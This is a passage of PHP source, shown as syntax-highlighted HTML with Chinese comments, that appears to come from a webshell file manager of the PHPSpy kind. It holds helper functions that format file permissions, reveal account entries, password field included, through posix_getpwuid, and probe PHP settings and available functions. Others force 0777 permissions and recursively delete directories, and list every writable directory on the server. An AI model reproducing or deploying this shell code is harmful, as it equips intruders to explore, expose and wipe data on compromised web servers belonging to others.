<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">owner</span>[<span style="color: #ad7fa8; font-style: italic;">'execute'</span>] = ($<span style="color: #eeeeec;">mode</span> &amp; <span style="color: #eeeeec; background-color: #2e3436;">00100</span>) ? <span style="color: #ad7fa8; font-style: italic;">'x'</span> : <span style="color: #ad7fa8; font-style: italic;">'-'</span>; 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">group</span>[<span style="color: #ad7fa8; font-style: italic;">'read'</span>] = ($<span style="color: #eeeeec;">mode</span> &amp; <span style="color: #eeeeec; background-color: #2e3436;">00040</span>) ? <span style="color: #ad7fa8; font-style: italic;">'r'</span> : <span style="color: #ad7fa8; font-style: italic;">'-'</span>; 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">group</span>[<span style="color: #ad7fa8; font-style: italic;">'write'</span>] = ($<span style="color: #eeeeec;">mode</span> &amp; <span style="color: #eeeeec; background-color: #2e3436;">00020</span>) ? <span style="color: #ad7fa8; font-style: italic;">'w'</span> : <span style="color: #ad7fa8; font-style: italic;">'-'</span>; 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">group</span>[<span style="color: #ad7fa8; font-style: italic;">'execute'</span>] = ($<span style="color: #eeeeec;">mode</span> &amp; <span style="color: #eeeeec; background-color: #2e3436;">00010</span>) ? <span style="color: #ad7fa8; font-style: italic;">'x'</span> : <span style="color: #ad7fa8; font-style: italic;">'-'</span>; 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">world</span>[<span style="color: #ad7fa8; font-style: italic;">'read'</span>] = ($<span style="color: #eeeeec;">mode</span> &amp; <span style="color: #eeeeec; background-color: #2e3436;">00004</span>) ? <span style="color: #ad7fa8; font-style: italic;">'r'</span> : <span style="color: #ad7fa8; font-style: italic;">'-'</span>; 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">world</span>[<span style="color: #ad7fa8; font-style: italic;">'write'</span>] = ($<span style="color: #eeeeec;">mode</span> &amp; <span style="color: #eeeeec; background-color: #2e3436;">00002</span>) ? <span style="color: #ad7fa8; font-style: italic;">'w'</span> : <span style="color: #ad7fa8; font-style: italic;">'-'</span>; 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">world</span>[<span style="color: #ad7fa8; font-style: italic;">'execute'</span>] = ($<span style="color: #eeeeec;">mode</span> &amp; <span style="color: #eeeeec; background-color: #2e3436;">00001</span>) ? <span style="color: #ad7fa8; font-style: italic;">'x'</span> : <span style="color: #ad7fa8; font-style: italic;">'-'</span>; 

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>( $<span style="color: #eeeeec;">mode</span> &amp; <span style="color: #eeeeec; background-color: #2e3436;">0</span>x800 ) {$<span style="color: #eeeeec;">owner</span>[<span style="color: #ad7fa8; font-style: italic;">'execute'</span>] = ($<span style="color: #eeeeec;">owner</span>[<span style="color: #ad7fa8; font-style: italic;">'execute'</span>]==<span style="color: #ad7fa8; font-style: italic;">'x'</span>) ? <span style="color: #ad7fa8; font-style: italic;">'s'</span> : <span style="color: #ad7fa8; font-style: italic;">'S'</span>;}
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>( $<span style="color: #eeeeec;">mode</span> &amp; <span style="color: #eeeeec; background-color: #2e3436;">0</span>x400 ) {$<span style="color: #eeeeec;">group</span>[<span style="color: #ad7fa8; font-style: italic;">'execute'</span>] = ($<span style="color: #eeeeec;">group</span>[<span style="color: #ad7fa8; font-style: italic;">'execute'</span>]==<span style="color: #ad7fa8; font-style: italic;">'x'</span>) ? <span style="color: #ad7fa8; font-style: italic;">'s'</span> : <span style="color: #ad7fa8; font-style: italic;">'S'</span>;}
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>( $<span style="color: #eeeeec;">mode</span> &amp; <span style="color: #eeeeec; background-color: #2e3436;">0</span>x200 ) {$<span style="color: #eeeeec;">world</span>[<span style="color: #ad7fa8; font-style: italic;">'execute'</span>] = ($<span style="color: #eeeeec;">world</span>[<span style="color: #ad7fa8; font-style: italic;">'execute'</span>]==<span style="color: #ad7fa8; font-style: italic;">'x'</span>) ? <span style="color: #ad7fa8; font-style: italic;">'t'</span> : <span style="color: #ad7fa8; font-style: italic;">'T'</span>;}

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> $<span style="color: #eeeeec;">type</span><span style="color: #f57900; font-weight: bold;">.</span>$<span style="color: #eeeeec;">owner</span>[<span style="color: #ad7fa8; font-style: italic;">'read'</span>].$<span style="color: #eeeeec;">owner</span>[<span style="color: #ad7fa8; font-style: italic;">'write'</span>].$<span style="color: #eeeeec;">owner</span>[<span style="color: #ad7fa8; font-style: italic;">'execute'</span>].$<span style="color: #eeeeec;">group</span>[<span style="color: #ad7fa8; font-style: italic;">'read'</span>].$<span style="color: #eeeeec;">group</span>[<span style="color: #ad7fa8; font-style: italic;">'write'</span>].$<span style="color: #eeeeec;">group</span>[<span style="color: #ad7fa8; font-style: italic;">'execute'</span>].$<span style="color: #eeeeec;">world</span>[<span style="color: #ad7fa8; font-style: italic;">'read'</span>].$<span style="color: #eeeeec;">world</span>[<span style="color: #ad7fa8; font-style: italic;">'write'</span>].$<span style="color: #eeeeec;">world</span>[<span style="color: #ad7fa8; font-style: italic;">'execute'</span>];
}

<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">getUser</span>($<span style="color: #eeeeec;">filepath</span>)<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span>  {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #eeeeec; background-color: #2e3436;">function_exists(</span><span style="color: #ad7fa8; font-style: italic;">'posix_getpwuid'</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">array</span> = @<span style="color: #eeeeec; background-color: #2e3436;">posix_getpwuid(</span>@<span style="color: #eeeeec; background-color: #2e3436;">fileowner(</span>$<span style="color: #eeeeec;">filepath</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">array</span> &amp;&amp; <span style="color: #eeeeec; background-color: #2e3436;">is_array(</span>$<span style="color: #eeeeec;">array</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> <span style="color: #ad7fa8; font-style: italic;">' / &lt;a href="#" title="User: '</span>.$<span style="color: #eeeeec;">array</span>[<span style="color: #ad7fa8; font-style: italic;">'name'</span>].<span style="color: #ad7fa8; font-style: italic;">'&amp;#13&amp;#10Passwd: '</span>.$<span style="color: #eeeeec;">array</span>[<span style="color: #ad7fa8; font-style: italic;">'passwd'</span>].<span style="color: #ad7fa8; font-style: italic;">'&amp;#13&amp;#10Uid: '</span>.$<span style="color: #eeeeec;">array</span>[<span style="color: #ad7fa8; font-style: italic;">'uid'</span>].<span style="color: #ad7fa8; font-style: italic;">'&amp;#13&amp;#10gid: '</span>.$<span style="color: #eeeeec;">array</span>[<span style="color: #ad7fa8; font-style: italic;">'gid'</span>].<span style="color: #ad7fa8; font-style: italic;">'&amp;#13&amp;#10Gecos: '</span>.$<span style="color: #eeeeec;">array</span>[<span style="color: #ad7fa8; font-style: italic;">'gecos'</span>].<span style="color: #ad7fa8; font-style: italic;">'&amp;#13&amp;#10Dir: '</span>.$<span style="color: #eeeeec;">array</span>[<span style="color: #ad7fa8; font-style: italic;">'dir'</span>].<span style="color: #ad7fa8; font-style: italic;">'&amp;#13&amp;#10Shell: '</span>.$<span style="color: #eeeeec;">array</span>[<span style="color: #ad7fa8; font-style: italic;">'shell'</span>].<span style="color: #ad7fa8; font-style: italic;">'"&gt;'</span>.$<span style="color: #eeeeec;">array</span>[<span style="color: #ad7fa8; font-style: italic;">'name'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/a&gt;'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> <span style="color: #ad7fa8; font-style: italic;">''</span>;
}

<span style="color: #888a85;">// </span><span style="color: #888a85;">&#21024;&#38500;&#30446;&#24405;</span>
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">deltree</span>($<span style="color: #eeeeec;">deldir</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">mydir</span>=<span style="color: #729fcf; font-weight: bold;">@dir</span>($<span style="color: #eeeeec;">deldir</span>);<span style="background-color: #404040;"> </span>  
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">while</span>($<span style="color: #eeeeec;">file</span>=$<span style="color: #eeeeec;">mydir</span>-&gt;<span style="color: #eeeeec; background-color: #2e3436;">read</span>())<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span>  {<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span>  
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>((<span style="color: #eeeeec; background-color: #2e3436;">is_dir(</span>$<span style="color: #eeeeec;">deldir</span>.<span style="color: #ad7fa8; font-style: italic;">'/'</span>.$<span style="color: #eeeeec;">file</span>)) &amp;&amp; ($<span style="color: #eeeeec;">file</span>!=<span style="color: #ad7fa8; font-style: italic;">'.'</span>) &amp;&amp; ($<span style="color: #eeeeec;">file</span>!=<span style="color: #ad7fa8; font-style: italic;">'..'</span>)) { 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">chmod(</span>$<span style="color: #eeeeec;">deldir</span>.<span style="color: #ad7fa8; font-style: italic;">'/'</span>.$<span style="color: #eeeeec;">file</span>,<span style="color: #eeeeec; background-color: #2e3436;">0777</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">deltree(</span>$<span style="color: #eeeeec;">deldir</span>.<span style="color: #ad7fa8; font-style: italic;">'/'</span>.$<span style="color: #eeeeec;">file</span>); 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #eeeeec; background-color: #2e3436;">is_file(</span>$<span style="color: #eeeeec;">deldir</span>.<span style="color: #ad7fa8; font-style: italic;">'/'</span>.$<span style="color: #eeeeec;">file</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">chmod(</span>$<span style="color: #eeeeec;">deldir</span>.<span style="color: #ad7fa8; font-style: italic;">'/'</span>.$<span style="color: #eeeeec;">file</span>,<span style="color: #eeeeec; background-color: #2e3436;">0777</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">unlink(</span>$<span style="color: #eeeeec;">deldir</span>.<span style="color: #ad7fa8; font-style: italic;">'/'</span>.$<span style="color: #eeeeec;">file</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">mydir</span>-&gt;<span style="color: #eeeeec; background-color: #2e3436;">close</span>(); 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">chmod(</span>$<span style="color: #eeeeec;">deldir</span>,<span style="color: #eeeeec; background-color: #2e3436;">0777</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> @<span style="color: #eeeeec; background-color: #2e3436;">rmdir(</span>$<span style="color: #eeeeec;">deldir</span>) ? <span style="color: #eeeeec; background-color: #2e3436;">1</span> : <span style="color: #eeeeec; background-color: #2e3436;">0</span>;
}

<span style="color: #888a85;">// </span><span style="color: #888a85;">&#34920;&#26684;&#34892;&#38388;&#30340;&#32972;&#26223;&#33394;&#26367;&#25442;</span>
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">bg</span>() {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">global</span> $<span style="color: #eeeeec;">bgc</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> ($<span style="color: #eeeeec;">bgc</span>++%<span style="color: #eeeeec; background-color: #2e3436;">2</span>==<span style="color: #eeeeec; background-color: #2e3436;">0</span>) ? <span style="color: #ad7fa8; font-style: italic;">'alt1'</span> : <span style="color: #ad7fa8; font-style: italic;">'alt2'</span>;
}

<span style="color: #888a85;">// </span><span style="color: #888a85;">&#33719;&#21462;&#24403;&#21069;&#30340;&#25991;&#20214;&#31995;&#32479;&#36335;&#24452;</span>
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">getPath</span>($<span style="color: #eeeeec;">scriptpath</span>, $<span style="color: #eeeeec;">nowpath</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">nowpath</span> == <span style="color: #ad7fa8; font-style: italic;">'.'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">nowpath</span> = $<span style="color: #eeeeec;">scriptpath</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">nowpath</span> = <span style="color: #eeeeec; background-color: #2e3436;">str_replace(</span><span style="color: #ad7fa8; font-style: italic;">'\\'</span>, <span style="color: #ad7fa8; font-style: italic;">'/'</span>, $<span style="color: #eeeeec;">nowpath</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">nowpath</span> = <span style="color: #eeeeec; background-color: #2e3436;">str_replace(</span><span style="color: #ad7fa8; font-style: italic;">'//'</span>, <span style="color: #ad7fa8; font-style: italic;">'/'</span>, $<span style="color: #eeeeec;">nowpath</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #eeeeec; background-color: #2e3436;">substr(</span>$<span style="color: #eeeeec;">nowpath</span>, -<span style="color: #eeeeec; background-color: #2e3436;">1</span>) != <span style="color: #ad7fa8; font-style: italic;">'/'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">nowpath</span> = $<span style="color: #eeeeec;">nowpath</span>.<span style="color: #ad7fa8; font-style: italic;">'/'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> $<span style="color: #eeeeec;">nowpath</span>;
}

<span style="color: #888a85;">// </span><span style="color: #888a85;">&#33719;&#21462;&#24403;&#21069;&#30446;&#24405;&#30340;&#19978;&#32423;&#30446;&#24405;</span>
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">getUpPath</span>($<span style="color: #eeeeec;">nowpath</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">pathdb</span> = <span style="color: #eeeeec; background-color: #2e3436;">explode(</span><span style="color: #ad7fa8; font-style: italic;">'/'</span>, $<span style="color: #eeeeec;">nowpath</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">num</span> = <span style="color: #eeeeec; background-color: #2e3436;">count(</span>$<span style="color: #eeeeec;">pathdb</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">num</span> &gt; <span style="color: #eeeeec; background-color: #2e3436;">2</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">unset(</span>$<span style="color: #eeeeec;">pathdb</span>[$<span style="color: #eeeeec;">num</span>-<span style="color: #eeeeec; background-color: #2e3436;">1</span>],$<span style="color: #eeeeec;">pathdb</span>[$<span style="color: #eeeeec;">num</span>-<span style="color: #eeeeec; background-color: #2e3436;">2</span>]);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">uppath</span> = <span style="color: #eeeeec; background-color: #2e3436;">implode(</span><span style="color: #ad7fa8; font-style: italic;">'/'</span>, $<span style="color: #eeeeec;">pathdb</span>).<span style="color: #ad7fa8; font-style: italic;">'/'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">uppath</span> = <span style="color: #eeeeec; background-color: #2e3436;">str_replace(</span><span style="color: #ad7fa8; font-style: italic;">'//'</span>, <span style="color: #ad7fa8; font-style: italic;">'/'</span>, $<span style="color: #eeeeec;">uppath</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> $<span style="color: #eeeeec;">uppath</span>;
}

<span style="color: #888a85;">// </span><span style="color: #888a85;">&#26816;&#26597;PHP&#37197;&#32622;&#21442;&#25968;</span>
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">getcfg</span>($<span style="color: #eeeeec;">varname</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">result</span> = <span style="color: #eeeeec; background-color: #2e3436;">get_cfg_var(</span>$<span style="color: #eeeeec;">varname</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">result</span> == <span style="color: #eeeeec; background-color: #2e3436;">0</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> <span style="color: #ad7fa8; font-style: italic;">'No'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">result</span> == <span style="color: #eeeeec; background-color: #2e3436;">1</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> <span style="color: #ad7fa8; font-style: italic;">'Yes'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> $<span style="color: #eeeeec;">result</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
}

<span style="color: #888a85;">// </span><span style="color: #888a85;">&#26816;&#26597;&#20989;&#25968;&#24773;&#20917;</span>
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">getfun</span>($<span style="color: #eeeeec;">funName</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> (<span style="color: #8ae234;">false</span> !== <span style="color: #eeeeec; background-color: #2e3436;">function_exists(</span>$<span style="color: #eeeeec;">funName</span>)) ? <span style="color: #ad7fa8; font-style: italic;">'Yes'</span> : <span style="color: #ad7fa8; font-style: italic;">'No'</span>;
}

<span style="color: #888a85;">// </span><span style="color: #888a85;">&#33719;&#24471;&#25991;&#20214;&#25193;&#23637;&#21517;</span>
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">getext</span>($<span style="color: #eeeeec;">file</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">info</span> = <span style="color: #eeeeec; background-color: #2e3436;">pathinfo(</span>$<span style="color: #eeeeec;">file</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> $<span style="color: #eeeeec;">info</span>[<span style="color: #ad7fa8; font-style: italic;">'extension'</span>];
}

<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">GetWDirList</span>($<span style="color: #eeeeec;">dir</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">global</span> $<span style="color: #eeeeec;">dirdata</span>,$<span style="color: #eeeeec;">j</span>,$<span style="color: #eeeeec;">nowpath</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> !$<span style="color: #eeeeec;">j</span> &amp;&amp; $<span style="color: #eeeeec;">j</span>=<span style="color: #eeeeec; background-color: #2e3436;">1</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">dh</span> = <span style="color: #eeeeec; background-color: #2e3436;">opendir(</span>$<span style="color: #eeeeec;">dir</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">while</span> ($<span style="color: #eeeeec;">file</span> = <span style="color: #eeeeec; background-color: #2e3436;">readdir(</span>$<span style="color: #eeeeec;">dh</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">f</span>=<span style="color: #eeeeec; background-color: #2e3436;">str_replace(</span><span style="color: #ad7fa8; font-style: italic;">'//'</span>,<span style="color: #ad7fa8; font-style: italic;">'/'</span>,$<span style="color: #eeeeec;">dir</span>.<span style="color: #ad7fa8; font-style: italic;">'/'</span>.$<span style="color: #eeeeec;">file</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>($<span style="color: #eeeeec;">file</span>!=<span style="color: #ad7fa8; font-style: italic;">'.'</span> &amp;&amp; $<span style="color: #eeeeec;">file</span>!=<span style="color: #ad7fa8; font-style: italic;">'..'</span> &amp;&amp; <span style="color: #eeeeec; background-color: #2e3436;">is_dir(</span>$<span style="color: #eeeeec;">f</span>)){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #eeeeec; background-color: #2e3436;">is_writable(</span>$<span style="color: #eeeeec;">f</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dirdata</span>[$<span style="color: #eeeeec;">j</span>][<span style="color: #ad7fa8; font-style: italic;">'filename'</span>]=<span style="color: #eeeeec; background-color: #2e3436;">str_replace(</span>$<span style="color: #eeeeec;">nowpath</span>,<span style="color: #ad7fa8; font-style: italic;">''</span>,$<span style="color: #eeeeec;">f</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dirdata</span>[$<span style="color: #eeeeec;">j</span>][<span style="color: #ad7fa8; font-style: italic;">'mtime'</span>]=<span style="color: #729fcf; font-weight: bold;">@date</span>(<span style="color: #ad7fa8; font-style: italic;">'Y-m-d H:i:s'</span>,<span style="color: #eeeeec; background-color: #2e3436;">filemtime(</span>$<span style="color: #eeeeec;">f</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dirdata</span>[$<span style="color: #eeeeec;">j</span>][<span style="color: #ad7fa8; font-style: italic;">'dirchmod'</span>]=<span style="color: #eeeeec; background-color: #2e3436;">getChmod(</span>$<span style="color: #eeeeec;">f</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dirdata</span>[$<span style="color: #eeeeec;">j</span>][<span style="color: #ad7fa8; font-style: italic;">'dirperm'</span>]=<span style="color: #eeeeec; background-color: #2e3436;">getPerms(</span>$<span style="color: #eeeeec;">f</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dirdata</span>[$<span style="color: #eeeeec;">j</span>][<span style="color: #ad7fa8; font-style: italic;">'dirlink'</span>]=$<span style="color: #eeeeec;">dir</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dirdata</span>[$<span style="color: #eeeeec;">j</span>][<span style="color: #ad7fa8; font-style: italic;">'server_link'</span>]=$<span style="color: #eeeeec;">f</span>;
